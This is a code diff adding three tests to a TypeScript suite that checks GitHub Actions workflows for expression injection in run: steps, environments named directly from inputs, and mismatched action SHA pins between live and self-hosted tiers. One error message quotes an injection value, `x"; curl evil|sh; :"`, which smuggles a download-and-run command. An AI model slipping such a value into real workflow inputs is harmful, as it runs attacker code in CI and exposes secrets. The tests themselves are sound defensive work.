@@ -593,6 +593,91 @@ describe('CI workflow tripwire', () => {
 		).toEqual([]);
 	});
 
+	// Rule 7d — EXPRESSION INJECTION (P2-24 / GATE-46). A `${{ … }}` expression is
+	// substituted into the script TEXT before the shell ever sees it, so an
+	// attacker-chosen input becomes commands. Secrets and inputs reach a `run:`
+	// through `env:`, where the runner sets them as shell VARIABLES.
+	test('no run: line interpolates an input or secret', () => {
+		const offenders: string[] = [];
+		for (const { rel, src } of allWorkflows) {
+			let inRun = false;
+			for (const [index, raw] of src.split('\n').entries()) {
+				if (/^\s*run:\s*\|?\s*$/.test(raw) || /^\s*run:\s+\S/.test(raw)) inRun = true;
+				else if (/^\s*-?\s*(?:name|uses|with|env|if|id|shell|working-directory):/.test(raw)) {
+					inRun = false;
+				}
+				if (!inRun) continue;
+				if (/\$\{\{\s*(?:inputs|github\.event|secrets)\./.test(raw)) {
+					offenders.push(`${rel}:${index + 1}  ${raw.trim().slice(0, 90)}`);
+				}
+			}
+		}
+		expect(
+			offenders,
+			'A `${{ … }}` expression inside `run:` is substituted into the SCRIPT TEXT: an input ' +
+				'like `x"; curl evil|sh; :"` becomes commands. Pass it through `env:` and read the ' +
+				`shell variable instead.\n  ${offenders.join('\n  ')}`,
+		).toEqual([]);
+	});
+
+	// Rule 7e — an `environment:` GitHub can AUTO-CREATE has no protection rules,
+	// so the manual approval CI.md relies on would exist only as an unexecuted UI
+	// step (P2-24 / GATE-46).
+	test('no job names its environment straight from an input', () => {
+		const offenders: string[] = [];
+		for (const { rel, src } of allWorkflows) {
+			for (const [index, raw] of src.split('\n').entries()) {
+				if (/^\s*environment:\s*\$\{\{\s*inputs\.\w+\s*\}\}\s*$/.test(raw)) {
+					offenders.push(`${rel}:${index + 1}`);
+				}
+			}
+		}
+		expect(
+			offenders,
+			'`environment: ${{ inputs.x }}` AUTO-CREATES the named environment with NO protection ' +
+				'rules when it does not exist yet. Map the input to an enumerated set of ' +
+				`configured environments instead.\n  ${offenders.join('\n  ')}`,
+		).toEqual([]);
+	});
+
+	// Rule 8b — THE PARKED TIER CANNOT ROT BEHIND THE LIVE ONE (P2-24 / CARRY-12).
+	// Dependabot's github-actions ecosystem scans `.github/workflows` ONLY, so
+	// `.github/workflows-selfhosted/` receives no update PRs at all: on activation
+	// day its pins would be older than everything around them. Config cannot fix
+	// that — GitHub does not scan the directory — so the gate is that any action
+	// used in BOTH places carries the SAME SHA. Dependabot bumps the live copy;
+	// this makes forgetting the parked copy a red build instead of a surprise.
+	test('an action used in both tiers is pinned to the same SHA', () => {
+		const pins = new Map<string, Map<string, string[]>>();
+		for (const { rel, src } of allWorkflows) {
+			for (const match of src.matchAll(/uses:\s*([\w./-]+)@([0-9a-f]{40})/g)) {
+				const action = match[1] as string;
+				const sha = match[2] as string;
+				const byAction = pins.get(action) ?? new Map<string, string[]>();
+				byAction.set(sha, [...(byAction.get(sha) ?? []), rel]);
+				pins.set(action, byAction);
+			}
+		}
+		// Anti-vacuity: the scan must actually see both tiers.
+		expect(pins.size).toBeGreaterThan(3);
+		expect(pins.has('actions/checkout')).toBe(true);
+
+		const split: string[] = [];
+		for (const [action, byAction] of pins) {
+			if (byAction.size < 2) continue;
+			const detail = [...byAction.entries()]
+				.map(([sha, files]) => `${sha.slice(0, 12)} in ${files.join(', ')}`)
+				.join(' | ');
+			split.push(`${action}: ${detail}`);
+		}
+		expect(
+			split,
+			'The same action is pinned to different SHAs in different workflows. The parked ' +
+				'self-hosted tier gets no Dependabot PRs, so a live-tier bump must be carried ' +
+				`across by hand — that is what this catches.\n  ${split.join('\n  ')}`,
+		).toEqual([]);
+	});
+
 	test('anti-vacuity: the permissions matchers fire on the shapes they forbid', () => {
 		// Without these controls the two rules above are "this list is empty" over
 		// a corpus that happens to be clean today.
